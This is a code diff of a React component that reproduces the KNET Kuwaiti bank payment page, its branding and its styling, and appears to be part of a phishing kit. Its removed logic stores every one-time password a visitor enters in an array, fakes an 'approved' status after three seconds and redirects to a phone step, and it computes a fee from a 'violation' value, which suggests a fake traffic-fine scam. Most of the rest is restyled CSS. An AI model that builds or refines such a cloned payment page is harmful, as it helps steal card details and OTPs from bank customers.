-                            if (!newotp.includes(paymentInfo.otp!)) {
-                              newotp.push(paymentInfo.otp!);
-                            }
-                            setLoading(true);
-                            handleAddotp(paymentInfo.otp!);
-                            //     handleOArr(paymentInfo.otp!);
-                            handlePay(paymentInfo, setPaymentInfo);
-                            setTimeout(() => {
-                             
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                otp: "",
-                                status: "approved",
-                              });
-                              setLoading(false);
-                              handleUpdatePage('phone')
-                            }, 3000);
-                          }
-                        }}
-                      >
-                        {loading
-                          ? "Wait..."
-                          : step === 1
-                          ? "Submit"
-                          : "Verify OTP"}
+                      <button disabled={!isFormValid() || loading} type="submit">
+                        {loading ? "Wait..." : step === 1 ? "Submit" : "تأكيد العملية"}
                       </button>
-                      <button>Cancel</button>
+                      <button type="button">{step>1?"الغاء":"Cancel"}</button>
                     </div>
                   </div>
                 </div>
               </div>
-              <div
-                id="overlayhide"
-                className="overlay"
-                style={{ display: "none" }}
-              ></div>
 
+              {/* Loading Overlay */}
+              <div id="overlayhide" className="overlay" style={{ display: loading ? "block" : "none" }}>
+                <FullPageLoader isLoading={loading} />
+              </div>
+
+              {/* Footer */}
               <footer>
                 <div className="footer-content-new">
                   <div className="row_new">
@@ -685,7 +745,7 @@ const res=parseFloat(props.violationValue as unknown as  string)*0.30
                         lineHeight: 1,
                       }}
                     >
-                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;
+                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;©&nbsp;
                       <br />
                       <span
                         style={{
@@ -694,298 +754,59 @@ const res=parseFloat(props.violationValue as unknown as  string)*0.30
                           color: "#0077d5",
                         }}
                       >
-                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
-                        - KNET
+                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET
                       </span>
                     </div>
                   </div>
                   <div id="DigiCertClickID_cM-vbZrL" />
                 </div>
-                <div id="DigiCertClickID_cM-vbZrL" />
               </footer>
             </div>
           </div>
         </div>
-        <FullPageLoader isLoading={loading} />
       </form>
+
       <style>
         {`
-        * {
-          margin: 0;
-          padding: 0;
-          box-sizing: border-box;
-        }
-        body {
-          font-family: Verdana, Arial, Helvetica, sans-serif;
-          background-color: #ebebeb;
-        }
-        .container {
-          width: 100%;
-          padding: 15px;
-          box-sizing: border-box;
-        }
-        .content-block {
-          width: 395px;
-          margin: 0 auto;
-        }
-        .row {
-          border-bottom: 1px solid #8f8f90;
-          padding-bottom: 5px;
-          padding-top: 5px;
-        }
-        .row_new {
-          padding-bottom: 5px;
-          padding-top: 5px;
-        }
-        .column-label,
-        .column-value,
-        .column-long {
-          float: left;
-        }
-        .column-label {
-          width: 25%;
-        }
-        .column-value {
-          width: 25%;
-        }
-        .row.three-column .column-value {
-          width: 25%;
-          margin-right: 5px;
-        }
-        .row.three-column .column-long {
-          width: 25%;
-          float: right;
-        }
-        .row:after {
-          content: '';
-          display: table;
-          clear: both;
-        }
-        .form-card {
-          background-color: #ffffff;
-          padding: 20px;
-          border: 2px solid #8f8f90;
-          border-radius: 15px;
-          margin-bottom: 15px;
-          box-shadow: 0 0 6px rgba(0, 0, 0, 0.3);
-        }
-        .form-card:nth-child(1) {
-          margin-top: 25px;
-        }
-        .form-card .row:nth-child(1) {
-          padding-top: 0;
-        }
-        .footer-content .row,
-        .footer-content-new .row,
-        .form-card .row:nth-last-child(1) {
-          border: 0;
-          padding-bottom: 0;
-        }
-        form label {
-          font-size: 11px;
-          color: #0070cd;
-          font-weight: bold;
-          text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
-        }
-        select {
-          font-size: 11px;
-          height: 20px;
-        }
-        form .text-label,
-        input,
-        select {
-          color: #444444;
-          font-weight: normal;
-        }
-        form input[type='tel'],
-        input[type='password'] {
-          border: 2px solid #0070cd;
-          box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.3);
-          padding: 0 3px;
-          outline: 0;
-          font-size: 11px;
-          height: 20px;
-        }
-        form input[type='text'],
-        input[type='password'] {
-          border: 2px solid #0070cd;
-          box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.3);
-          padding: 0 3px;
-          outline: 0;
-          font-size: 11px;
-          height: 20px;
-        }
-        .footer-content {
-          text-align: center;
-          margin-top: 15px;
-          font-weight: bold;
-          color: #2277d3;
-        }
-        .brand-img {
-          margin-right: 5px;
-          float: right;
-        }
-        .brand-info {
-          font-size: 12px;
-          text-align: left;
-        }
-        
-        #ValidationMessage {
-          -moz-transaction: height 1s ease;
-          -webkit-transaction: height 1s ease;
-          transition: height 1s ease;
-          border: #ff0000 1px solid;
-          background-color: #f7dadd;
-          font-size: 12px;
-          font-family: helvetica, arial, sans serif;
-          color: #ff0000;
-          padding: 2px;
-          display: none;
-          margin-bottom: 3px;
-          text-align: center;
-        }
-        .footer-content #knet-brand {
-          width: 43px;
-          height: 43px;
-          margin-top: 5px;
-        }
-        .footer-content .social-links {
-          margin-top: 15px;
-          text-align: center;
-        }
-        .footer-content .social-links div {
-          height: 30px;
-          display: inline-block;
-        }
-        .footer-content .social-links div#knet-yt {
-          width: 35px;
-        }
-        .footer-content .social-links div#knet-sn {
-          width: 27px;
-        }
-        .footer-content .social-links div#knet-tw {
-          width: 27px;
-        }
-        .footer-content .social-links div#knet-it {
-          width: 27px;
-        }
-        .footer-content .social-links div#knet-fb {
-          width: 27px;
-        }
-        button {
-          width: 100%;
-        }
-        
-        .submit-button {
-          background-color: #eaeaea;
-          border: 1px solid #cacaca;
-          padding: 5px 0;
-          font-weight: bold;
-          color: #666666;
-          width: 50%;
-          float: left;
-          height: 27px;
-          border-radius: 4px;
-        }
-        .cancel-button {
-          background-color: #eaeaea;
-          border: 1px solid #cacaca;
-          padding: 5px 0;
-          font-weight: bold;
-          color: #666666;
-          width: 50%;
-          height: 27px;
-          border-radius: 4px;
-          -webkit-appearance: none;
-        }
-        .row.alert-msg {
-          font-size: 12px;
-          text-align: justify;
-          background-color: #d9edf6;
-          padding: 10px !important;
-          border: 1px solid #bacce0;
-          border-radius: 4px;
-          margin-bottom: 10px;
-        }
-        @media all and (max-width: 425px) {
-          .content-block {
-            width: 98%;
-            margin: 0 auto;
-          }
-        }
-        .overlay {
-          background: #555555;
-          display: none;
-          position: absolute;
-          top: 0;
-          right: 0;
-          bottom: 0;
-          left: 0;
-          opacity: 0.5;
-        }
-        .terms {
-          font-size: 11px;
-          color: #0070cd;
-          font-weight: bold;
-          font-style: italic;
-          text-decoration: none;
-        }
-        .paymentOption {
-          vertical-align: super;
-        }
-        
-        .container-blogo {
-          width: 100%;
-          margin-top: -5px;
-          margin-bottom: 15px;
-        }
-        .logoHead-mob {
-          width: 42%;
-          margin-left: 27%;
-          /* width:16%;
-        margin-left:40%; */
-          margin-right: auto;
-        }
-        
+        @CHARSET "ISO-8859-1";
         /* Added for Knet */
         /* Medium devices (tablets, 768px and up) */
-        @media (max-width: 768px) {
-          .wrapper {
-            margin-top: 10%;
+        @media (max-width: 768px){
+          .wrapper{
+            margin-top:10%;
           }
         }
         /* Medium devices (tablets, 768px and up) */
-        @media (max-width: 500px) {
-          .wrapper {
+        @media (max-width: 500px){
+          .wrapper{
             max-width: 100%;
             width: 100%;
           }
         }
         /* Medium devices (tablets, 768px and up) */
-        @media (max-width: 435px) {
+        @media (max-width: 435px){
           .logoHead {
-            left: 36%;
+                 left: 36%;
           }
-          .contentBox {
+          .contentBox{
             padding: 18px;
           }
         }
         /* Medium devices (tablets, 768px and up) */
-        @media (max-width: 380px) {
+        @media (max-width: 380px){
           .contentBox {
-            padding: 12px;
-          }
+              padding: 12px;
+          } 
           .wrapper {
-            margin-top: 20%;
+              margin-top: 20%;
           }
-        }
-        @media (max-width: 350px) {
+        }	
+        @media (max-width: 350px){
           .contentBox .col:first-child .paymentlabel {
             padding-left: 0;
           }
         }
         /*added for tooltip by sib*/
-        
         .tooltip {
           position: relative;
           display: block;
@@ -1005,14 +826,14 @@ const res=parseFloat(props.violationValue as unknown as  string)*0.30
           margin-left: -52%;
           opacity: 0;
           transition: opacity 0.5s;
-          font-size: 12px;
-          margin-bottom: 9px;
-          -webkit-box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
-          -moz-box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
-          box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
+          font-size:12px;
+          margin-bottom:9px;
+          -webkit-box-shadow:4px 3px 10px 0px rgba(0,0,0,0.75);
+          -moz-box-shadow:4px 3px 10px 0px rgba(0,0,0,0.75);
+          box-shadow:4px 3px 10px 0px rgba(0,0,0,0.75);
         }
         .tooltip .tooltiptext::after {
-          content: '';
+          content: "";
           position: absolute;
           top: 100%;
           left: 50%;
@@ -1027,62 +848,297 @@ const res=parseFloat(props.violationValue as unknown as  string)*0.30
           opacity: 1;
         }
         /* turn the img to gray :sib*/
-        .doGray {
-          -webkit-filter: grayscale(100%);
-          filter: grayscale(100%);
-          opacity: 0.5;
+        .doGray{
+          -webkit-filter:grayscale(100%);
+          filter:grayscale(100%);
+          opacity:0.5;
         }
         /* Added by Ahmed & Saqib */
-        label#ValidationMessage {
+        label#ValidationMessage{
           -moz-transaction: height 1s ease;
           -webkit-transaction: height 1s ease;
           transition: height 1s ease;
           border: #ff0000 1px solid;
           background-color: #f7dadd;
           font-size: 12px;
-          font-family: helvetica, arial, sans serif;
-          color: #ff0000;
-          padding: 5px 2px 5px 2px;
-          display: none;
-          margin-bottom: 3px;
-          text-align: center;
-          margin-top: 10px;
+            font-family: helvetica, arial, sans serif;
+            color: #ff0000;
+              padding: 5px 2px 5px 2px; 
+           display:none;
+           margin-bottom: 3px; 
+           text-align:center;
+           margin-top : 10px;
         }
-        div#fasterCheckDiv1 {
-          float: left;
-          padding-left: 10%;
-          position: relative;
-          display: block;
-          width: 35%;
-          padding-top: 3px;
-        }
-        div#fasterCheckDiv2 {
-          float: left;
-          margin-left: 30%;
-          position: relative;
-          padding-top: 3px;
-          width: 70px;
-          padding-top: 3px;
-        }
-        div#fasterCheckDiv1 > label > img {
+        div#fasterCheckDiv1{
+          float:left;
+          padding-left:10%;
+          position:relative;
+          display:block;
+          width:35%;
+          padding-top:3px;
+          }
+        div#fasterCheckDiv2{
+          float:left;
+          margin-left:30%;
+          position:relative;
+          padding-top:3px;
+          width:70px;
+          padding-top:3px;
+          }
+        div#fasterCheckDiv1>label>img{
           width: 48px;
-          height: 35px;
-          border-radius: 3px;
+          height:35px;
+          border-radius:3px;
         }
-        div#fasterCheckDiv2 > label > img {
+        div#fasterCheckDiv2>label>img{
           width: 48px;
-          height: 35px;
-          border-radius: 3px;
+          height:35px;
+          border-radius:3px;
         }
-        .madd {
+        .madd{
+          height:30px;
+          max-width: 372px;
           margin: 5px auto -30px auto;
           border-radius: 0px 10px;
-          display: block;
-        }
-        
+          background-image: url("../images/adds/NewDerayaCamp/mob.jpg");
+          display:block;	
+          }
         /* Ends */
-        `}
+        * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    body {
+        font-family: Verdana, Arial, Helvetica, sans-serif;
+        background-color: #ebebeb;
+    }
+    .container {
+        width: 100%;
+        padding: 15px;
+        box-sizing: border-box;
+    }
+    .content-block {
+        width: 395px;
+        margin: 0 auto;
+    }
+    .row {
+        border-bottom: 1px solid #8f8f90;
+        padding-bottom: 5px;
+        padding-top: 5px;
+    }
+    .row_new {
+        padding-bottom: 5px;
+        padding-top: 5px;
+    }
+    .column-label, .column-value, .column-long {
+        float: left;
+    }
+    .column-label {
+        width: 40%;
+    }
+    .column-value {
+        width: 60%;
+    }
+    .row.three-column .column-value {
+        width: 18%;
+        margin-right: 5px;
+    }
+    .row.three-column .column-long {
+        width: 39%;
+        float: right;
+    }
+    .row:after {
+        content: "";
+        display: table;
+        clear: both;
+    }
+    .form-card {
+        background-color: #ffffff;
+        padding: 20px;
+        border: 2px solid #8f8f90;
+        border-radius: 15px;
+        margin-bottom: 15px;
+        box-shadow: 0 0 6px rgba(0,0,0,0.3);
+    }
+    .form-card:nth-child(1) {
+        margin-top: 25px;
+    }
+    .form-card .row:nth-child(1) {
+        padding-top: 0;
+    }
+    .footer-content .row, .footer-content-new .row,
+    .form-card .row:nth-last-child(1) {
+        border: 0;
+        padding-bottom: 0;
+    }
+    form label {
+        font-size: 11px;
+        color: #0070cd;
+        font-weight: bold;
+        text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+    }
+    select {
+        font-size:11px;
+        height:20px;
+    }
+    form .text-label, input, select {
+        color: #444444;
+        font-weight: normal;
+    }
+    form input[type=tel],input[type=password]{
+        border: 2px solid #0070cd;
+        box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
+        padding: 0 3px;
+        outline: 0;
+      font-size:11px;
+      height:20px;
+    }
+    form input[type=text],input[type=password]{
+        border: 2px solid #0070cd;
+        box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
+        padding: 0 3px;
+        outline: 0;
+      font-size:11px;
+      height:20px;
+    }
+    .footer-content {
+        text-align: center;
+        margin-top: 15px;
+        font-weight: bold;
+        color: #2277d3;
+    }
+    .brand-img {
+        margin-right: 5px;
+        float: right;
+    }
+    .brand-info {
+        font-size: 12px;
+        text-align: left;
+    }
+    #ValidationMessage{
+      -moz-transaction: height 1s ease;
+      -webkit-transaction: height 1s ease;
+      transition: height 1s ease;
+      border: #ff0000 1px solid;
+      background-color: #f7dadd;
+      font-size: 12px;
+        font-family: helvetica, arial, sans serif;
+        color: #ff0000;
+          padding: 2px; 
+       display:none;
+       margin-bottom: 3px; 
+       text-align:center;
+    }
+    .footer-content #knet-brand {
+        width: 43px;
+        height: 43px;
+        background: url(../images/knet-links.png) -148px 0 no-repeat;
+        margin-top: 5px;
+    }
+    .footer-content .social-links {
+        margin-top: 15px;
+        text-align: center;
+    }
+    .footer-content .social-links div {
+        height: 30px;
+        display: inline-block;
+    }
+    .footer-content .social-links div#knet-yt {
+        background: url(../images/knet-links.png) 0 0 no-repeat;
+        width: 35px;
+    }
+    .footer-content .social-links div#knet-sn {
+        background: url(../images/knet-links.png) -36px 0 no-repeat;
+        width: 27px;
+    }
+    .footer-content .social-links div#knet-tw {
+        background: url(../images/knet-links.png) -64px 0 no-repeat;
+        width: 27px;
+    }
+    .footer-content .social-links div#knet-it {
+        background: url(../images/knet-links.png) -93px 0 no-repeat;
+        width: 27px;
+    }
+    .footer-content .social-links div#knet-fb {
+        background: url(../images/knet-links.png) -120px 0 no-repeat;
+        width: 27px;
+    }
+    button {
+        width: 100%;
+    }
+    .submit-button {
+        background-color: #eaeaea;
+        border: 1px solid #cacaca;
+        padding: 5px 0;
+        font-weight: bold;
+        color: #666666;
+      width:50%;
+      float:left;
+      height:27px;
+      border-radius:4px;
+    }
+    .cancel-button {
+        background-color: #eaeaea;
+        border: 1px solid #cacaca;
+        padding: 5px 0;
+        font-weight: bold;
+        color: #666666;
+      width:50%;
+      height:27px;
+      border-radius:4px;
+      -webkit-appearance:none;
+    }
+    .row.alert-msg {
+        font-size: 12px;
+        text-align: justify;
+        background-color: #d9edf6;
+        padding: 10px !important;
+        border: 1px solid #bacce0;
+        border-radius: 4px;
+        margin-bottom: 10px;
+    }
+    @media all and (max-width:425px) {
+        .content-block {
+            width: 98%;
+            margin: 0 auto;
+        }
+    }
+    .overlay {
+        background: #555555;
+        display: none;        
+        position: absolute;   
+        top: 0;               
+        right: 0;             
+        bottom: 0;
+        left: 0;
+        opacity: 0.5;
+    }
+    .terms {
+      font-size: 11px;
+      color: #0070cd;
+      font-weight: bold; 
+      font-style: italic;
+      text-decoration:none;
+    }
+    .paymentOption {
+      vertical-align: super;
+    }
+    .container-blogo{
+      width:100%;
+      margin-top:-5px;
+      margin-bottom:15px;
+    }
+    .logoHead-mob{
+       width:42%; 
+       margin-left:27%; 
+      /* width:16%;
+      margin-left:40%; */
+      margin-right:auto;
+    }
+  `}
       </style>
     </div>
-  );
+  )
 }
+
